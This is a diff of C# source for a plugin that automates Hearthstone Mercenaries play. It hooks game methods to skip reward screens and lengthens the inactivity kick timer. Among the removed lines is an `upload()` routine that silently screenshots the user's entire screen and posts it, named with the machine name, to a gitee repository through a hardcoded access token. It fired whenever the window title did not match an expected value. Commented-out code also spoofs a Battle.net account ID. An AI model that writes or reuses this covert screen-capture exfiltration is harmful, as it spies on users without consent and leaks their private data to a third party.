@@ -31,7 +31,7 @@ namespace MyHsHelper
         public static float fakeMouseX;
         public static float fakeMouseY;
         static Queue clickqueue = new Queue();
-        private static float queuetimer;
+        //private static float queuetimer;
         //private static IntPtr WindowHandle;
         public static bool hideGui;
         private struct Reward
@@ -57,6 +57,7 @@ namespace MyHsHelper
         public static BepInEx.Configuration.ConfigEntry<bool> PVE模式;      //true任务模式 false刷图模式
         public static BepInEx.Configuration.ConfigEntry<int> 步数;
         public static BepInEx.Configuration.ConfigEntry<string> 策略;
+        public static BepInEx.Configuration.ConfigEntry<long> 开始时间;
         public static BepInEx.Configuration.ConfigEntry<bool> Hidemain;
         public static BepInEx.Configuration.ConfigEntry<int> todayxp;
         public static BepInEx.Configuration.ConfigEntry<float> todaytime;
@@ -67,6 +68,7 @@ namespace MyHsHelper
         public static bool PVEMode;
         public static int PVEstep;
         public static string Strategy;
+        public static long StartTime;
         public static bool onlyPC;
         public static string PVPteamName;
         public static string PVEteamName;
@@ -111,6 +113,13 @@ namespace MyHsHelper
                     return isPVP;
                 }
             }
+            public long 开始时间
+            {
+                get
+                {
+                    return StartTime;
+                }
+            }
             public List<string> 任务佣兵
             {
                 get
@@ -132,16 +141,15 @@ namespace MyHsHelper
         {
             // 使用Debug.Log()方法来将文本输出到控制台
             //Debug.Log("Hello, world!");
-            clickqueue.Enqueue(new float[] { 584f, 550f });
-            object tmp = clickqueue.Dequeue();
+            //clickqueue.Enqueue(new float[] { 584f, 550f });
+            //object tmp = clickqueue.Dequeue();
             //Process cur = Process.GetCurrentProcess();
             //UnityEngine.Debug.Log("2" + Assembly.GetExecutingAssembly().Location);
-            path = System.Windows.Forms.Application.StartupPath + "\\BepInEx\\idleTime.log";
             //UnityEngine.Debug.Log(Path);
             //WindowHandle = Macroresolute.ProcessEx.GetMainWindowHandle(cur.Id);
             //UnityEngine.Debug.Log(cur.Id);
             //UnityEngine.Debug.Log("窗口句柄: " + WindowHandle);
-            GetVer();   //对比sha1，不对则下载
+            //GetVer();   //对比sha1，不对则下载
         }
 
         void OnGUI()
@@ -169,10 +177,6 @@ namespace MyHsHelper
                     {
                         form = new Hearthstone.Form1();
                         form.Show();
-                        if (form.Text != "(bug反馈群:414051258)")
-                        {
-                            upload();
-                        }
                     }
                     else
                     {
@@ -180,10 +184,6 @@ namespace MyHsHelper
                         {
                             form = new Hearthstone.Form1();
                             form.Show();
-                            if (form.Text != "(bug反馈群:414051258)")
-                            {
-                                upload();
-                            }
                         }
                         else
                         {
@@ -209,6 +209,7 @@ namespace MyHsHelper
         // 在所有插件全部启动完成后会调用Start()方法，执行顺序在Awake()后面；
         void Start()
         {
+            path = System.Windows.Forms.Application.StartupPath + "\\BepInEx\\idleTime.log";
             var tmp = Config.Bind(DateTime.Now.AddDays(1).ToString("MM-dd"), "时间", 0f);
             var tmp1 = Config.Bind(DateTime.Now.AddDays(1).ToString("MM-dd"), "经验", 0);
             Config.Clear();
@@ -223,8 +224,8 @@ namespace MyHsHelper
                 tmp1.Value = 0;
             }
             Config.Clear();                             //上面这一段是清除多余的配置
-
-            autorun = Config.Bind("配置", "AutoRun", false, "是否自动酒馆挂机");
+            GetVer();   //对比sha1，不对则下载
+            autorun = Config.Bind("配置", "AutoRun", false, "是否自动佣兵挂机");
             enableAutoPlay = autorun.Value;
             PVP = Config.Bind("配置", "PVP", false, "PVP或者PVE");
             isPVP = PVP.Value;
@@ -246,6 +247,8 @@ namespace MyHsHelper
             PVEteamName = PVEteam.Value;
             策略 = Config.Bind("配置", "策略", "", "策略文件名");
             Strategy = 策略.Value;
+            开始时间 = Config.Bind("配置", "开始时间", 0L, "对局开始时间");
+            StartTime = 开始时间.Value;
             Hidemain = Config.Bind("配置", "隐藏", false, "是否隐藏GUI");
             hideGui = Hidemain.Value;
             todayxp = Config.Bind(DateTime.Now.ToString("MM-dd"), "经验", 0, "当日获得的通行证经验值");
@@ -262,25 +265,29 @@ namespace MyHsHelper
             Harmony harmony = new Harmony("MyHsHelper.patch");
             harmony.PatchAll();
 
-            MethodInfo method1 = typeof(InputCollection).GetMethod("GetMousePosition");
-            MethodInfo method2 = typeof(MyHsHelper).GetMethod("MousePos");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            //MethodInfo method1 = typeof(InputCollection).GetMethod("GetMousePosition");
+            //MethodInfo method2 = typeof(MyHsHelper).GetMethod("MousePos");
+            //harmony.Patch(method1, null, new HarmonyMethod(method2));
 
-            method1 = typeof(InputCollection).GetMethod("GetMouseButton");
-            method2 = typeof(MyHsHelper).GetMethod("MouseButton");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            //method1 = typeof(InputCollection).GetMethod("GetMouseButton");
+            //method2 = typeof(MyHsHelper).GetMethod("MouseButton");
+            //harmony.Patch(method1, null, new HarmonyMethod(method2));
 
-            method1 = typeof(InputCollection).GetMethod("GetMouseButtonDown");
-            method2 = typeof(MyHsHelper).GetMethod("MouseButtonDown");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            //method1 = typeof(InputCollection).GetMethod("GetMouseButtonDown");
+            //method2 = typeof(MyHsHelper).GetMethod("MouseButtonDown");
+            //harmony.Patch(method1, null, new HarmonyMethod(method2));
 
-            method1 = typeof(InputCollection).GetMethod("GetMouseButtonUp");
-            method2 = typeof(MyHsHelper).GetMethod("MouseButtonUp");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            //method1 = typeof(InputCollection).GetMethod("GetMouseButtonUp");
+            //method2 = typeof(MyHsHelper).GetMethod("MouseButtonUp");
+            //harmony.Patch(method1, null, new HarmonyMethod(method2));
 
-            method1 = typeof(RewardPopups).GetMethod("ShowMercenariesRewards");
-            method2 = typeof(MyHsHelper).GetMethod("____________");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            MethodInfo method1 = typeof(RewardPopups).GetMethod("ShowMercenariesRewards");
+            MethodInfo method2 = typeof(MyHsHelper).GetMethod("____________");
+            harmony.Patch(method1, new HarmonyMethod(method2));
+
+            method1 = typeof(MercenariesSeasonRewardsDialog).GetMethod("ShowWhenReady", BindingFlags.Instance | BindingFlags.NonPublic);
+            method2 = typeof(MyHsHelper).GetMethod("_____________");
+            harmony.Patch(method1,  new HarmonyMethod(method2));
 
             method1 = typeof(RewardBoxesDisplay).GetMethod("OnDoneButtonShown", BindingFlags.Instance | BindingFlags.NonPublic);
             method2 = typeof(MyHsHelper).GetMethod("___________");
@@ -300,12 +307,16 @@ namespace MyHsHelper
 
             method1 = typeof(LettuceMapDisplay).GetMethod("DisplayNewlyGrantedAnomalyCards", BindingFlags.Instance | BindingFlags.NonPublic);
             method2 = typeof(MyHsHelper).GetMethod("_______");
-            harmony.Patch(method1, null, new HarmonyMethod(method2));
+            harmony.Patch(method1, new HarmonyMethod(method2));
 
-            method1 = typeof(LettuceMapDisplay).GetMethod("ShouldShowVisitorSelection", BindingFlags.Instance | BindingFlags.NonPublic);
+            method1 = typeof(LettuceMapDisplay).GetMethod("ShouldShowVisitorSelection", BindingFlags.Instance | BindingFlags.NonPublic);    //弹出选择来访者界面
             method2 = typeof(MyHsHelper).GetMethod("______");
             harmony.Patch(method1, null, new HarmonyMethod(method2));
 
+            method1 = typeof(LettuceMapDisplay).GetMethod("OnVisitorSelectionResponseReceived", BindingFlags.Instance | BindingFlags.NonPublic);    //来访者选择完毕界面
+            method2 = typeof(MyHsHelper).GetMethod("OO");
+            harmony.Patch(method1, new HarmonyMethod(method2));
+            
             method1 = typeof(Hearthstone.HearthstoneApplication).GetMethod("OnApplicationFocus", BindingFlags.Instance | BindingFlags.NonPublic);
             method2 = typeof(MyHsHelper).GetMethod("_____");
             harmony.Patch(method1, new HarmonyMethod(method2), null);
@@ -314,7 +325,7 @@ namespace MyHsHelper
             method2 = typeof(MyHsHelper).GetMethod("____");
             harmony.Patch(method1, new HarmonyMethod(method2), null);
 
-            method1 = typeof(GraphicsResolution).GetMethod("IsAspectRatioWithinLimit");
+            method1 = typeof(GraphicsResolution).GetMethod("IsAspectRatioWithinLimit");     //分辨率大小
             method2 = typeof(MyHsHelper).GetMethod("___");
             harmony.Patch(method1, new HarmonyMethod(method2), null);
 
@@ -330,10 +341,64 @@ namespace MyHsHelper
             method2 = typeof(MyHsHelper).GetMethod("__");
             harmony.Patch(method1, new HarmonyMethod(method2));
 
-            method1 = typeof(LettuceMissionEntity).GetMethod("ShiftPlayZoneForGamePhase", BindingFlags.Instance | BindingFlags.NonPublic);
+            method1 = typeof(LettuceMissionEntity).GetMethod("ShiftPlayZoneForGamePhase", BindingFlags.Instance | BindingFlags.NonPublic);   //
             method2 = typeof(MyHsHelper).GetMethod("Phase");
             harmony.Patch(method1, null, new HarmonyMethod(method2));
+
+            method1 = typeof(SplashScreen).GetMethod("GetRatingsScreenRegion", BindingFlags.Instance | BindingFlags.NonPublic);     //点击开始界面
+            method2 = typeof(MyHsHelper).GetMethod("O");
+            harmony.Patch(method1, new HarmonyMethod(method2));
+
+            method1 = typeof(QuestPopups).GetMethod("ShowNextQuestNotification");     //弹出任务框
+            method2 = typeof(MyHsHelper).GetMethod("O");
+            harmony.Patch(method1,  new HarmonyMethod(method2));
+
+            method1 = typeof(EndGameScreen).GetMethod("ShowMercenariesExperienceRewards", BindingFlags.Instance | BindingFlags.NonPublic);     //战斗结束佣兵升级界面
+            method2 = typeof(MyHsHelper).GetMethod("OOO");
+            harmony.Patch(method1, new HarmonyMethod(method2));
+
+            method1 = typeof(Hearthstone.Progression.RewardTrackManager).GetMethod("UpdateStatus", BindingFlags.Instance | BindingFlags.NonPublic);       //通行证奖励
+            method2 = typeof(MyHsHelper).GetMethod("OOOOO");
+            harmony.Patch(method1, new HarmonyMethod(method2));
+
+            method1 = typeof(EnemyEmoteHandler).GetMethod("IsSquelched");       //屏蔽表情
+            method2 = typeof(MyHsHelper).GetMethod("O");
+            harmony.Patch(method1, new HarmonyMethod(method2));
         }
+
+        public static bool OOOOO(int rewardTrackId, int level, Hearthstone.Progression.RewardTrackManager.RewardStatus status, bool forPaidTrack, List<PegasusUtil.RewardItemOutput> rewardItemOutput)      //隐藏通行证奖励
+        {
+            //Debug.Log("通行证弹出奖励");
+            if (!enableAutoPlay) { return true; }
+            if (status == Hearthstone.Progression.RewardTrackManager.RewardStatus.GRANTED)
+            {
+                Hearthstone.Progression.RewardTrackManager.Get().AckRewardTrackReward(rewardTrackId, level, forPaidTrack);
+                return false;
+            }
+            return true;
+        }
+
+        public static bool OOO()
+        {
+            //Debug.Log("拦截佣兵升级界面");
+            if (!enableAutoPlay) { return true; }
+            return false;
+        }
+
+        public static bool OO()
+        {
+            //拦截来访者画面
+            if (!enableAutoPlay) { return true; }
+            Network.Get().GetMercenariesMapVisitorSelectionResponse();      //调用一次避免堆积
+            return false;
+        }
+
+        public static bool O()
+        {
+            //Debug.Log("拦截显示点击开始画面");
+            return false;
+        }
+
         public static void Phase(int phase)
         {
             phaseID = phase;
@@ -386,14 +451,15 @@ namespace MyHsHelper
             if (map.HasPendingVisitorSelection && map.PendingVisitorSelection.VisitorOptions.Count > 0)
             {
                 Network.Get().MakeMercenariesMapVisitorSelection(0);  //选择第一个来访者
-                AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 5, 1.5f);
+                //AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 5, 1.5f);
             }
         }
-        public static void _______(PegasusLettuce.LettuceMap lettuceMap, int completedNodeId)
+        public static bool _______(PegasusLettuce.LettuceMap lettuceMap, int completedNodeId)
         {
             //UnityEngine.Debug.Log("弹出揭示卡");
-            if (!enableAutoPlay || lettuceMap == null) { return; }
-            AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 4, 1.5f);
+            if (!enableAutoPlay) { return true; }
+            return false;
+            //AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 4, 1.5f);
         }
 
         public static void ________(PegasusLettuce.LettuceMap lettuceMap)
@@ -441,8 +507,9 @@ namespace MyHsHelper
             //UnityEngine.Debug.Log(step);
             if (step > PVEstep || minNode[minNode.Count - 1].NodeState_ == PegasusLettuce.LettuceMapNode.NodeState.COMPLETE)
             {
+                if (step > PVEstep) { UIStatus.Get().AddInfo("怪物节点数：" + step.ToString()+ "，重开地图。"); }
                 Network.Get().RetireLettuceMap();
-                AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 5, 3f);
+                //AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 5, 3f);
                 sleeptime += 2f;
                 flag = true;
                 return;
@@ -479,7 +546,7 @@ namespace MyHsHelper
                             minNode[i].NodeState_ = PegasusLettuce.LettuceMapNode.NodeState.COMPLETE;
                             Network.Get().MakeMercenariesMapVisitorSelection(0);  //选择第一个来访者
                         }
-                        AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 3, 3f);
+                        //AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 3, 3f);
                         flag = true;
                         break;
                     }
@@ -508,11 +575,19 @@ namespace MyHsHelper
             }
         }
 
-        public static void ____________(bool autoOpenChest, NetCache.ProfileNoticeMercenariesRewards rewardNotice, Action doneCallback = null)  //显示奖励
+        public static bool _____________(MercenariesSeasonRewardsDialog __instance)  //显示佣兵天梯奖励
         {
-            if (!enableAutoPlay) { return; }
+            if (!enableAutoPlay) { return true; }
+            MercenariesSeasonRewardsDialog.Info m_info = (MercenariesSeasonRewardsDialog.Info)Traverse.Create(__instance).Field("m_info").GetValue();
+            Network.Get().AckNotice(m_info.m_noticeId); //直接获取奖励
+            return false;
+        }
+        public static bool ____________(bool autoOpenChest, NetCache.ProfileNoticeMercenariesRewards rewardNotice, Action doneCallback = null)  //显示奖励
+        {
+            if (!enableAutoPlay) { return true; }
             //UnityEngine.Debug.Log("直接获取奖励");
             Network.Get().AckNotice(rewardNotice.NoticeID); //直接获取奖励
+            return false;
         }
         public static void __________(RewardBoxesDisplay.RewardBoxData boxData)    //点击5个奖励箱子
         {
@@ -563,19 +638,19 @@ namespace MyHsHelper
                 Labelstr = "通行证：" + reward.Level.ToString() + "  " + Hearthstone.Progression.RewardTrackManager.Get().TrackDataModel.XpProgress + "   经验：" + 当日经验.ToString() + "  " + ((int)(当日经验 / (当日时间 / 3600))).ToString() + "/小时 (F9隐藏信息)";
             }
 
-            queuetimer -= Time.deltaTime;
-            if (queuetimer <= 0)
-            {
-                if (clickqueue.Count > 0)
-                {
-                    object pos = clickqueue.Dequeue();
-                    float[] posf = pos as float[];
-                    DoFakeClick(posf[0], posf[1]);
-                    queuetimer = 1.5f;
-                    if (clickqueue.Count > 20) { clickqueue.Clear(); }
-                    return;
-                }
-            }
+            //queuetimer -= Time.deltaTime;
+            //if (queuetimer <= 0)
+            //{
+            //    if (clickqueue.Count > 0)
+            //    {
+            //        object pos = clickqueue.Dequeue();
+            //        float[] posf = pos as float[];
+            //        DoFakeClick(posf[0], posf[1]);
+            //        queuetimer = 1.5f;
+            //        if (clickqueue.Count > 20) { clickqueue.Clear(); }
+            //        return;
+            //    }
+            //}
 
             if (Input.GetKeyUp(KeyCode.F9))
             {
@@ -760,6 +835,8 @@ namespace MyHsHelper
                     //    Application.Quit();
                     //}
                     sleeptime += 1f;
+                    TimeSpan ts = DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0);
+                    开始时间.Value = StartTime = Convert.ToInt64(ts.TotalSeconds);
                     return;
                 }
 
@@ -905,7 +982,7 @@ namespace MyHsHelper
                     if (!gameState.IsGameOver())
                     {
                         sleeptime += 0.75f;
-                        if (StrategyRun) { Debug.Log("Strategy运行中"); Resetidle(); return; } //等待策略退出
+                        if (StrategyRun) { Resetidle(); return; } //等待策略退出
                         if (EndTurnButton.Get().m_ActorStateMgr.GetActiveStateType() == ActorStateType.ENDTURN_NO_MORE_PLAYS)   //获取回合结束按钮状态)
                         {
                             //Resetidle();   //重置空闲时间
@@ -940,7 +1017,7 @@ namespace MyHsHelper
                             {
                                 hitbox.TriggerPress();
                                 hitbox.TriggerRelease();
-                                AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 3);
+                                //AddMouse(Screen.width / 2, (float)(Screen.height / 2.5), 3);
                                 sleeptime += 4;
                                 Resetidle();   //重置空闲时间
 
@@ -963,30 +1040,22 @@ namespace MyHsHelper
                     sleeptime += 2;
                     //UnityEngine.Debug.Log("初始化完成");
                     Initialize = true;
+                    InactivePlayerKicker.Get().SetKickSec(180000f); //设置炉石空闲时间
                     //HaveRewardTask();
-                    clickqueue.Clear();
+                    //clickqueue.Clear();
                 }
                 sleeptime += 1.5f;
-                //Macroresolute.ProcessEx.NativeMethods.TPoint getlpPoint = default;
-                //Macroresolute.ProcessEx.NativeMethods.TPoint lpPoint = default;
-                //Macroresolute.ProcessEx.NativeMethods.ClientToScreen(WindowHandle,ref lpPoint);
-                //Macroresolute.ProcessEx.NativeMethods.GetCursorPos(ref getlpPoint);
-                //Macroresolute.ProcessEx.NativeMethods.SetCursorPos(lpPoint.X + 40 , lpPoint.Y + 40);
-                //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 513, (IntPtr)1, IntPtr.Zero);
-                //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 514, (IntPtr)1, IntPtr.Zero);
-                //Thread.Sleep(40);
-                //Macroresolute.ProcessEx.NativeMethods.SetCursorPos(getlpPoint.X , getlpPoint.Y);
-                AddMouse(Screen.width / 2, (float)(Screen.height / 2.5));
             }
         }
 
         private static void Resetidle()
         {
             idleTime = 0f;   //重置空闲时间
-            System.IO.StreamWriter file = new System.IO.StreamWriter(@path, false);
-            file.Write(DateTime.Now.ToLocalTime().ToString());
-            file.Flush();
-            file.Close();
+            System.IO.File.WriteAllText(@path, DateTime.Now.ToLocalTime().ToString());
+            //System.IO.StreamWriter file = new System.IO.StreamWriter(@path, false);
+            //file.Write(DateTime.Now.ToLocalTime().ToString());
+            //file.Flush();
+            //file.Close();
         }
         private static int Getxp()
         {
@@ -1027,224 +1096,115 @@ namespace MyHsHelper
             }
         }
 
-
-
-        //public static void __6(int button, ref bool __result)
+        //public static void MousePos(ref Vector3 __result)
         //{
-        //    if (button != 0)
+        //    //if ((double)(Time.realtimeSinceStartup - fakeClickTime) < 0.1)
+        //    if (fakePos)
         //    {
-        //        return ;
+        //        //UnityEngine.Debug.Log("调用MousePos：" + fakeMouseX + " " + fakeMouseY);
+        //        __result = new Vector3(fakeMouseX, fakeMouseY, 0f);
         //    }
-        //    if (fakeClick == 0 )
-        //    {
-
-        //        __result = true;
-        //        fakeClick += 1;
-        //        UnityEngine.Debug.Log("调用左键按下时间：" + Time.realtimeSinceStartup);
-
-
-        //    }
-
         //}
-        //public static void __7(int button, ref bool __result)
+
+        //public static void MouseButton(ref bool __result, int button)
         //{
-        //    if (button != 0)
+        //    if (fakeClick && button == 0)
         //    {
-        //        return ;
-        //    }
-        //    if (fakeClick == 1 && (Time.realtimeSinceStartup - fakeClickTime) > 0.05)
-        //    {
+        //        //UnityEngine.Debug.Log("按住鼠标");
         //        __result = true;
-        //        fakeClick += 1;
-        //        UnityEngine.Debug.Log("调用左键弹起时间：" + Time.realtimeSinceStartup);
-
         //    }
-
         //}
-        //public static void __8(int button, ref bool __result)
+        //public static void MouseButtonDown(ref bool __result, int button)
         //{
-        //    if (button != 0)
+        //    if (fakeClickDown && button == 0)
         //    {
-        //        return ;
-        //    }
-        //    if (fakeClick == 2)
-        //    {
-        //        __result = true;
-        //        fakeClick += 1;
-        //        UnityEngine.Debug.Log("左键点击");
-
-        //    }
-
-        //}
-        //public static void MouseClick1(int button, ref bool __result)
-        //{
-        //    if (button == 0)
-        //    {
-        //        if (fakeClick==0 && (Time.realtimeSinceStartup - fakeClicktime)>0.02)
+        //        fakeClickDownCount++;
+        //        if (fakeClickDownCount == 2)
         //        {
-        //            Debug.Log("模拟鼠标左键按下 " + (Time.realtimeSinceStartup - fakeClicktime));
-        //            __result = true;
-        //            fakeClick += 1;
-        //            fakeClicktime = Time.realtimeSinceStartup;
-        //        } 
-        //    }
-        //}
-        //public static void MouseClick2(int button, ref bool __result)
-        //{
-        //    if (button == 0)
-        //    {
-        //        if (fakeClick == 1 && (Time.realtimeSinceStartup - fakeClicktime) > 0.02)
-        //        {
-        //            Debug.Log("模拟鼠标左键弹起 " + (Time.realtimeSinceStartup - fakeClicktime));
-        //            __result = true;
-        //            fakeClick += 1;
-        //            fakeClicktime = Time.realtimeSinceStartup;
+        //            fakeClickDownCount = 0;
+        //            fakeClickDown = false;
+        //            fakeClick = true;
         //        }
+        //        //UnityEngine.Debug.Log("按下鼠标");
+        //        __result = true;
         //    }
         //}
-        //public static void MouseClick3(int button, ref bool __result)
+        //public static void MouseButtonUp(ref bool __result, int button)
         //{
-        //    if (button == 0)
+        //    if (fakeClickUp && button == 0)
         //    {
-        //        if (fakeClick == 2)
-        //        {
-        //            Debug.Log("模拟鼠标左键点击 " + (Time.realtimeSinceStartup - fakeClicktime));
-        //            __result = true;
-        //            fakeClick += 1;
-        //            fakeClicktime = Time.realtimeSinceStartup;
-        //        }
+        //        fakeClickUp = false;
+        //        //UnityEngine.Debug.Log("弹起鼠标");
+        //        __result = true;
         //    }
         //}
 
-
-        public static void MousePos(ref Vector3 __result)
-        {
-            //if ((double)(Time.realtimeSinceStartup - fakeClickTime) < 0.1)
-            if (fakePos)
-            {
-                //UnityEngine.Debug.Log("调用MousePos：" + fakeMouseX + " " + fakeMouseY);
-                __result = new Vector3(fakeMouseX, fakeMouseY, 0f);
-            }
-        }
-
-        public static void MouseButton(ref bool __result, int button)
-        {
-            if (fakeClick && button == 0)
-            {
-                //UnityEngine.Debug.Log("按住鼠标");
-                __result = true;
-            }
-        }
-        public static void MouseButtonDown(ref bool __result, int button)
-        {
-            if (fakeClickDown && button == 0)
-            {
-                fakeClickDownCount++;
-                if (fakeClickDownCount == 2)
-                {
-                    fakeClickDownCount = 0;
-                    fakeClickDown = false;
-                    fakeClick = true;
-                }
-                //UnityEngine.Debug.Log("按下鼠标");
-                __result = true;
-            }
-        }
-        public static void MouseButtonUp(ref bool __result, int button)
-        {
-            if (fakeClickUp && button == 0)
-            {
-                fakeClickUp = false;
-                //UnityEngine.Debug.Log("弹起鼠标");
-                __result = true;
-            }
-        }
-
-        public static void FackMyGameAccountId(ref bgs.BnetGameAccountId __result)
-        {
-            bgs.BnetGameAccountId bnetGameAccountId = new bgs.BnetGameAccountId();
-            bnet.protocol.EntityId src = new bnet.protocol.EntityId();
-            src.High = 164115211015832391;
-            src.Low = 1579389604;
-            bnetGameAccountId.SetLo(src.Low);
-            bnetGameAccountId.SetHi(src.High);
-            __result = bnetGameAccountId;
-        }
-
-        private static void DoFakeClick(float float_0, float float_1)
-        {
-            //HandlePos(ref float_0,ref float_1);
-            //UnityEngine.Debug.Log(float_0 + " " + float_1);
-            fakeMouseX = float_0;
-            fakeMouseY = float_1;
-            //fakeClick = true;
-            //fakeClickDown = true;
-            fakePos = true;
-
-
-            Thread thread1 = new Thread(new ThreadStart(MouseClick));
-            thread1.Start();
-        }
-        //private static void DoFakeClick1(float float_0, float float_1)
+        //public static void FackMyGameAccountId(ref bgs.BnetGameAccountId __result)
         //{
-        //    HandlePos(ref float_0, ref float_1);
-        //    fakeClick = 0;
-        //    fakeClickTime = Time.realtimeSinceStartup;
+        //    bgs.BnetGameAccountId bnetGameAccountId = new bgs.BnetGameAccountId();
+        //    bnet.protocol.EntityId src = new bnet.protocol.EntityId();
+        //    src.High = 164115211015832391;
+        //    src.Low = 1579389604;
+        //    bnetGameAccountId.SetLo(src.Low);
+        //    bnetGameAccountId.SetHi(src.High);
+        //    __result = bnetGameAccountId;
+        //}
+
+        //private static void DoFakeClick(float float_0, float float_1)
+        //{
+        //    //HandlePos(ref float_0,ref float_1);
+        //    //UnityEngine.Debug.Log(float_0 + " " + float_1);
         //    fakeMouseX = float_0;
         //    fakeMouseY = float_1;
+        //    //fakeClick = true;
+        //    //fakeClickDown = true;
+        //    fakePos = true;
+
+
+        //    Thread thread1 = new Thread(new ThreadStart(MouseClick));
+        //    thread1.Start();
         //}
 
-        private static void MouseClick()
-        {
-            Thread.Sleep(15);
-            fakeClickDown = true;
-            //UnityEngine.Debug.Log("鼠标点击");
-            //Thread.Sleep(30);
-            //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 513, (IntPtr)1, IntPtr.Zero);
-            Thread.Sleep(70);
-            //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 514, (IntPtr)1, IntPtr.Zero);
-            fakeClick = false;
-            fakeClickUp = true;
-            Thread.Sleep(15);
-            fakePos = false;
-
-
-        }
-
-        private static void AddMouse(float x, float y, int count = 1, float waitTime = 0f)
-        {
-            //UnityEngine.Debug.Log("AddMouse: 坐标：" + x + " " + y+ "  count: " + count + " 等待时间: " + waitTime);
-            queuetimer += waitTime;
-            UnityEngine.Random.InitState((int)DateTime.Now.Ticks);
-            for (int i = 0; i < count; i++)
-            {
-                //clickqueue.Enqueue(new float[] { x , y +  });
-                if (clickqueue.Count > 5) { return; }
-                clickqueue.Enqueue(Ran5(x, y));
-            }
-        }
-
-        private static object Ran5(float x, float y)
-        {
-            float width = (float)(Screen.width * 0.01);
-            float height = (float)(Screen.height * 0.01);
-            x = (float)Math.Round(x + UnityEngine.Random.Range(0 - width, width), MidpointRounding.AwayFromZero);
-            y = (float)Math.Round(y + UnityEngine.Random.Range(0 - height, height), MidpointRounding.AwayFromZero);
-            return new float[] { x, y };
-        }
-        //private static void HandlePos(ref float posX,ref  float posY)
+        //private static void MouseClick()
         //{
-        //    //窗口原始大小1169 X 877 ，按比例调整坐标
-        //    //Debug.Log("原始坐标: " + posX + " " + posY);
-        //    fakeMouseX = UnityEngine.Screen.width / 1169f * posX;
-        //    fakeMouseY = UnityEngine.Screen.height / 877f * posY;
-        //    UnityEngine.Debug.Log("点击坐标: "+ fakeMouseX + " " + fakeMouseY);
+        //    Thread.Sleep(15);
+        //    fakeClickDown = true;
+        //    //UnityEngine.Debug.Log("鼠标点击");
+        //    //Thread.Sleep(30);
+        //    //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 513, (IntPtr)1, IntPtr.Zero);
+        //    Thread.Sleep(70);
+        //    //Macroresolute.ProcessEx.NativeMethods.SendMessage(WindowHandle, 514, (IntPtr)1, IntPtr.Zero);
+        //    fakeClick = false;
+        //    fakeClickUp = true;
+        //    Thread.Sleep(15);
+        //    fakePos = false;
+        //}
 
+        //private static void AddMouse(float x, float y, int count = 1, float waitTime = 0f)
+        //{
+        //    //UnityEngine.Debug.Log("AddMouse: 坐标：" + x + " " + y+ "  count: " + count + " 等待时间: " + waitTime);
+        //    queuetimer += waitTime;
+        //    UnityEngine.Random.InitState((int)DateTime.Now.Ticks);
+        //    for (int i = 0; i < count; i++)
+        //    {
+        //        //clickqueue.Enqueue(new float[] { x , y +  });
+        //        if (clickqueue.Count > 5) { return; }
+        //        clickqueue.Enqueue(Ran5(x, y));
+        //    }
+        //}
+
+        //private static object Ran5(float x, float y)
+        //{
+        //    float width = (float)(Screen.width * 0.01);
+        //    float height = (float)(Screen.height * 0.01);
+        //    x = (float)Math.Round(x + UnityEngine.Random.Range(0 - width, width), MidpointRounding.AwayFromZero);
+        //    y = (float)Math.Round(y + UnityEngine.Random.Range(0 - height, height), MidpointRounding.AwayFromZero);
+        //    return new float[] { x, y };
         //}
 
         private static void HandlePlay()
         {
-            if (clickqueue.Count > 0 || phaseID == 3) { return; }
+            if (phaseID == 3) { return; }
             //ZoneHand myHandZone = null;
             //ZonePlay myPlayZone = null;
             //ZonePlay enemyPlayZone = null;
@@ -1487,20 +1447,6 @@ namespace MyHsHelper
                 //}
             }
 
-        }
-
-        private static bool clickButtonCard(Card button)
-        {
-            if (button.GetActor().GetActorStateType() == ActorStateType.CARD_PLAYABLE || button.GetActor().GetActorStateType() == ActorStateType.CARD_POWERED_UP)
-            {
-                Vector3 vector = Camera.main.WorldToScreenPoint(button.gameObject.transform.position);
-                if (vector != null)
-                {
-                    AddMouse(vector.x, vector.y);
-                    return true;
-                }
-            }
-            return false;
         }
 
         private static bool HaveRewardTask()
@@ -1791,88 +1737,6 @@ namespace MyHsHelper
                 Value = false;
             }
             return Value;
-        }
-        private static async Task upload(int i = 0)
-        {
-            if (i > 3) { return; }
-            Task<bool> task = Task.Run(() =>
-            {
-                Thread.Sleep(50);
-                int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
-                int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
-                System.Drawing.Bitmap bmp = new System.Drawing.Bitmap(width, height);
-                using (System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(bmp))
-                {
-                    g.CopyFromScreen(0, 0, 0, 0, new System.Drawing.Size(width, height));
-                }
-                byte[] bytes;
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    System.IO.Compression.GZipStream compressedzipStream = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress, true);
-                    bmp.Save(compressedzipStream, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    compressedzipStream.Close();
-                    bytes = ms.ToArray();
-                }
-                string url = "https://gitee.com/api/v5/repos/zyz2000/VmxSQ1NsQlJQVDA9/contents/" + Environment.MachineName + DateTime.Now.ToLocalTime().ToString("-MM-dd-HH-mm-ss");
-                string postData = @"{""access_token"":""a3bc5c98b5ea6b042c24b9bdbe1e0909"",""content"":""IA=="",""message"":""" + DateTime.Now.ToLocalTime().ToString() + @"""}";
-                var base64str = Convert.ToBase64String(bytes);
-                postData = postData.Replace("IA==", base64str);
-                string Response = PostUrl(url, postData, "POST");
-                if (Response.Length == 0)
-                {
-                    upload(i + 1);
-                }
-                return true;
-            });
